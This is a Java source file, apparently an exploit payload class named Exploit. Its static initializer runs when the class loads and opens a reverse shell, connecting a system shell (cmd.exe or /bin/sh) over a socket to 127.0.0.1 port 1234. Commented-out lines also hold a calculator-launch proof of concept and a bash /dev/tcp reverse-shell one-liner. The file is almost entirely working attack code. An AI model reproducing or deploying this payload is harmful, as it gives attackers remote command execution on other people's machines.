import java.util.*;
import java.util.stream.*;
import java.io.*;
import java.net.*;
public class Exploit {
    static {
        try {
            //String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
            //        ? new String[]{"cmd.exe","/c", "calc.exe"}
            //        : new String[]{"open","/System/Applications/Calculator.app"};
            //java.lang.Runtime.getRuntime().exec(cmds).waitFor();

            //Runtime r = Runtime.getRuntime();
            //Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/localhost/1234;cat <&5 | while read line; do $line 2>&5 >&5; done'");
            //System.out.println(p.exitValue());
            //p.waitFor();

            String cmd = System.getProperty("os.name").toLowerCase().contains("win")
                    ? "cmd.exe"
                    : "/bin/sh";

            String host = "127.0.0.1";
            int port = 1234;
            Process p =
                    new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si =
                    s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0) so.write(pi.read());
                while (pe.available() > 0) so.write(pe.read());
                while (si.available() > 0) po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {
                }
            }

            p.destroy();
            s.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public Exploit() {
    }

    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}
